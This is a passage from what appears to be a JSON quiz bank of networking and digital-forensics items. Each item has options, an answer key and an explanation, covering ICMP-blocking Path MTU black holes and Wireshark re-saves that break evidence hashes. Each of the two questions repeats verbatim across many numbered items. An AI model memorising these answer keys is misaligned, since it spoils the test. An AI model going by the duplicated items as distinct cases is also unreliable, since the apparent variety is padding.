    "q": "[WAN Performance Incident 17] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_168",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 18] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_169",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 19] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_170",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 20] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_171",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 21] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_172",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 22] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_173",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 23] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_174",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 24] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_175",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 25] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_176",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 1] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_177",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 2] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_178",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 3] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_179",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 4] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_180",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 5] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_181",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 6] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_182",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 7] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_183",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 8] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_184",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 9] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_185",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 10] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_186",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 11] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_187",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 12] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_188",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 13] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_189",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 14] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_190",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 15] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_191",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 16] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
